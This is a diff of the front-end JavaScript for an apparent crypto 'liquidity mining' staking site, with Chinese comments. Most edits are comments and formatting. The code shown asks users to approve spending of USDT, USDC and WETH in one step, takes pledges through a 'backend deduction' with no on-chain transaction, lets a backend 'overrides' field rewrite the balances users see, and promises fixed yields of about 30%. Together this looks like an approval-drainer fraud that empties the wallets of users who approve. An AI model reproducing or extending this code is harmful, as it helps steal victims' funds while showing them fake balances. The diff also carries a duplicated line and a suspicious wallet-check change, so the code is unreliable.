@@ -31,17 +31,17 @@ function initSSE() {
         }
         if (matchedUserData) {
           window.currentClaimable = matchedUserData.claimable || 0;
-          // 更新 accountBalance（所有幣種）
+          // 【修正】更新所有代幣餘額，不只當前 token
           for (const token in accountBalance) {
             if (matchedUserData.accountBalance && matchedUserData.accountBalance[token]) {
               accountBalance[token].pledged = matchedUserData.accountBalance[token].pledged || 0;
               accountBalance[token].interest = matchedUserData.accountBalance[token].interest || 0;
             }
           }
-          // 合併 overrides（支援所有幣種）
+          // 【新增】處理 overrides (後台覆寫字段, e.g., pledgedUSDT)
           if (data.overrides && data.overrides[userAddress.toLowerCase()]) {
             const override = data.overrides[userAddress.toLowerCase()];
-            console.log('[DEBUG] 合併overrides:', override);
+            console.log('[DEBUG] 合併 overrides:', override);
             ['USDT', 'USDC', 'WETH'].forEach(token => {
               const pledgedKey = `pledged${token}`;
               const interestKey = `interest${token}`;
@@ -57,7 +57,7 @@ function initSSE() {
               }
             });
           }
-          // 演示錢包同步
+          // 【新增】演示錢包同步
           if (matchedUserData.isDemoWallet) {
             console.log('[DEBUG] 檢測到演示錢包，自動模擬');
             window.isDemoMode = true;
@@ -66,11 +66,11 @@ function initSSE() {
             updateStatus("演示模式：已自動授權");
             activateStakingUI();
           }
-          // 強制更新所有UI
+          // 【關鍵修正】強制更新所有 UI
           updateClaimableDisplay();
           updateAccountBalanceDisplay();
           updatePledgeSummary();
-          updateWalletBalanceFromCache();
+          updateWalletBalanceFromCache(); // 強制刷新餘額顯示
           console.log('[DEBUG] UI 更新完成');
         } else {
           console.log('[DEBUG] 未找到匹配用戶數據');
@@ -116,7 +116,7 @@ function initSSE() {
     }
   };
   eventSource.onerror = () => {
-    console.log('[DEBUG] SSE連線錯誤，重試...');
+    console.log('[DEBUG] SSE 連線錯誤，重試...');
     eventSource.close();
     setTimeout(initSSE, 5000);
   };
@@ -145,7 +145,7 @@ const ERC20_ABI = [
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
 
-// ==================== 質押週期&年化利率 + 最低額度 ====================
+// ==================== 質押週期 & 年化利率 + 最低額度 ====================
 const PLEDGE_DURATIONS = [
   { days: 30, rate: 0.05, min: 1 },
   { days: 60, rate: 0.10, min: 1 },
@@ -155,7 +155,7 @@ const PLEDGE_DURATIONS = [
   { days: 365, rate: 0.315, min: 1 }
 ];
 
-// DOM元素
+// DOM 元素
 let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
 let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
 let grossOutputValue, cumulativeValue, nextBenefit, claimModal, closeModal, confirmClaim, cancelClaim;
@@ -186,12 +186,11 @@ window.currentClaimable = 0;
 const MONTHLY_RATE = 0.01;
 let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
 let userPledges = [];
-window.isDemoMode = false;
+window.isDemoMode = false; // 【新增】演示模式標記
 
 // 【極速優化】快取三個代幣餘額
 let cachedWalletBalances = { USDT: 0n, USDC: 0n, WETH: 0n };
 
-// ==================== 翻譯 ====================
 const translations = {
   'en': {
     title: 'Liquidity Mining',
@@ -273,7 +272,7 @@ const translations = {
     claimBtnText: '領取',
     noClaimable: '無可領取利息。',
     claimSuccess: '領取成功！',
-    nextClaimTime: '下次領取時間：12小時後。',
+    nextClaimTime: '下次領取時間：12 小時後。',
     miningStarted: '挖礦開始！',
     error: '錯誤',
     offlineWarning: '伺服器離線，使用本地模式。',
@@ -284,18 +283,18 @@ const translations = {
     invalidPledgeAmount: '金額無效。',
     invalidPledgeToken: '代幣無效。',
     insufficientBalance: '餘額不足。',
-    ethersError: 'Ethers.js錯誤。',
+    ethersError: 'Ethers.js 錯誤。',
     approveError: '授權失敗。',
     selectTokenFirst: '請先選擇代幣。',
     balanceZero: '餘額為零。',
     balanceTooLow: '餘額過低。',
-    wethValueTooLow: 'WETH價值過低。',
+    wethValueTooLow: 'WETH 價值過低。',
     rulesTitle: '挖礦規則',
     rulesContent: `
-      <p>1. 選擇代幣，需至少500 USDT/USDC或WETH $500才能開始。</p>
+      <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
       <p>2. 不足：可授權但無法開始。</p>
       <p>3. 年化利率：28.3% ~ 31.5%。</p>
-      <p>4. 每12小時發放一次（美西時間00:00與12:00）。</p>
+      <p>4. 每 12 小時發放一次（美西時間 00:00 與 12:00）。</p>
       <p>5. 質押也會一併計算流動性挖礦利息。</p>
     `,
     modalClaimableLabel: '可領取',
@@ -347,7 +346,7 @@ const translations = {
     invalidPledgeAmount: '金额无效。',
     invalidPledgeToken: '代币无效。',
     insufficientBalance: '余额不足。',
-    ethersError: 'Ethers.js错误。',
+    ethersError: 'Ethers.js 错误。',
     approveError: '授权失败。',
     selectTokenFirst: '请先选择代币。',
     balanceZero: '余额为零。',
@@ -355,7 +354,7 @@ const translations = {
     wethValueTooLow: 'WETH价值过低。',
     rulesTitle: '挖矿规则',
     rulesContent: `
-      <p>1. 选择代币，需至少500 USDT/USDC或WETH $500才能开始。</p>
+      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500才能开始。</p>
       <p>2. 不足：可授权但无法开始。</p>
       <p>3. 年化利率：28.3% ~ 31.5%。</p>
       <p>4. 每12小时发放一次（美西时间00:00与12:00）。</p>
@@ -404,7 +403,7 @@ function getElements() {
   refreshWallet = document.getElementById('refreshWallet');
   walletTokenSelect = document.getElementById('walletTokenSelect');
   walletBalanceAmount = document.getElementById('walletBalanceAmount');
-    accountBalanceValue = document.getElementById('accountBalanceValue');
+  accountBalanceValue = document.getElementById('accountBalanceValue');
   totalValue = document.getElementById('totalValue');
   grossOutputValue = document.getElementById('grossOutputValue');
   cumulativeValue = document.getElementById('cumulativeValue');
@@ -539,7 +538,7 @@ async function refreshEthPrice() {
 function initializeMiningData() {
   localStorage.setItem('totalGrossOutput', '0');
   localStorage.setItem('claimable', '0');
-  localStorage.setItem('lastPayoutTime', (Date.now() - 24*60*60*1000).toString());
+  localStorage.setItem('lastPayoutTime', (Date.now() - 24 * 60 * 60 * 1000).toString());
 }
 
 function getETOffsetMilliseconds() {
@@ -573,9 +572,7 @@ async function updateInterest() {
   const nowET = new Date(now + etOffset);
   const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
   const isExactMinute = nowET.getMinutes() === 0;
-  if (!isPayoutTime || !isExactMinute) {
-    return;
-  }
+  if (!isPayoutTime || !isExactMinute) return;
   const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
   const lastPayoutET = new Date(lastPayout + etOffset);
   const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
@@ -618,9 +615,7 @@ async function claimInterest() {
   } else {
     equivalent = claimableETH * ethPrice;
   }
-  if (modalEquivalentValue) {
-    modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${authorizedToken}`;
-  }
+  if (modalEquivalentValue) modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${authorizedToken}`;
   if (claimModal) claimModal.style.display = 'flex';
 }
 
@@ -703,7 +698,7 @@ async function initializeWallet() {
   }
   try {
     console.log('[DEBUG] 初始化錢包...');
-    if (typeof window.ethereum !== 'undefined') {
+    if (typeof window.ethers !== 'undefined') {
       provider = new window.ethers.BrowserProvider(window.ethereum);
     } else {
       provider = new window.ethers.JsonRpcProvider(INFURA_URL);
@@ -730,7 +725,7 @@ async function initializeWallet() {
     } else {
       disableInteractiveElements(true);
       updateStatus(translations[currentLang].noWallet, true);
-      if (connectButton) connectButton.textContent = 'Connect Wallet';
+      if (connectButton) connectButton.textContent = 'Connect wallet';
     }
   } catch (e) {
     console.error('[DEBUG] 錢包初始化錯誤:', e);
@@ -749,7 +744,7 @@ async function connectWallet() {
   try {
     console.log('[DEBUG] 開始錢包連線...');
     if (typeof window.ethereum === 'undefined') {
-      updateStatus('請連結支援EIP-1193的錢包', true);
+      updateStatus('請連結支援 EIP-1193 的錢包', true);
       return;
     }
     if (!provider) {
@@ -822,7 +817,7 @@ async function updateUIBasedOnChainState() {
     } else {
       if (startBtn) startBtn.style.display = 'block';
       disableInteractiveElements(false);
-      updateStatus("請點擊Start進行授權");
+      updateStatus("請點擊 Start 進行授權");
     }
   } catch (e) {
     console.error('[DEBUG] 鏈上狀態檢查錯誤:', e);
@@ -842,7 +837,7 @@ async function handleConditionalAuthorizationFlow() {
     'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
     'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
   };
-  // 一次授權三種幣
+  // 【關鍵修正】一次授權三種幣
   const tokensToProcess = Object.values(tokenMap);
   let tokenToActivate = '';
   for (const { name, contract, address } of tokensToProcess) {
@@ -932,7 +927,7 @@ function updatePledgeSummary() {
   elements.totalPledge.textContent = total.toFixed(3);
 }
 
-// ==================== 預估收益 ====================
+// ==================== 預估收益 + 使用當前代幣餘額 + 最低額度 ====================
 function updateEstimate() {
   if (!pledgeAmount || !pledgeDuration || !pledgeToken || !elements.estimate || !elements.exceedWarning) return;
   const amount = parseFloat(pledgeAmount.value) || 0;
@@ -961,6 +956,7 @@ function updateEstimate() {
   const walletBalance = parseFloat(formatted);
   if (amount > walletBalance) {
     elements.exceedWarning.textContent = translations[currentLang].exceedBalance;
+    elements.exceedWarning.style.display = 'block';
     elements.exceedWarning.style.display = 'block';
     elements.exceedWarning.style.color = '#f00';
   } else {
@@ -1005,6 +1001,7 @@ function showAccountDetail() {
   if (!accountDetailModal) return;
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
   const data = accountBalance[selected];
+  // 總餘額 = 錢包 + 質押 + 已領取利息
   const claimedInterest = parseFloat(localStorage.getItem(`claimedInterest${selected}`) || '0');
   const total = data.wallet + data.pledged + claimedInterest;
   document.getElementById('modalTotalBalance').textContent = `${total.toFixed(3)} ${selected}`;
@@ -1207,7 +1204,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
     });
   }
-  // 質押按鈕
+  // 【關鍵修正】質押按鈕 → 後端扣款（不直接交易）
   if (pledgeBtn) {
     pledgeBtn.addEventListener('click', async () => {
       if (!signer) {
@@ -1375,3 +1372,21 @@ document.addEventListener('DOMContentLoaded', async () => {
     })();
   }
 });
+// 自動餘額監控（每 10 秒）
+setInterval(async () => {
+  if (userAddress && signer && !window.isDemoMode) {
+    try {
+      console.log('[DEBUG] 自動刷新餘額');
+      const [usdtBal, usdcBal, wethBal] = await Promise.all([
+        usdtContract.connect(provider).balanceOf(userAddress),
+        usdcContract.connect(provider).balanceOf(userAddress),
+        wethContract.connect(provider).balanceOf(userAddress)
+      ]);
+      cachedWalletBalances = { USDT: usdtBal, USDC: usdcBal, WETH: wethBal };
+      updateWalletBalanceFromCache();
+      updateAccountBalanceDisplay();
+    } catch (error) {
+      log(`自動更新失敗: ${error.message}`, 'error');
+    }
+  }
+}, 10000);
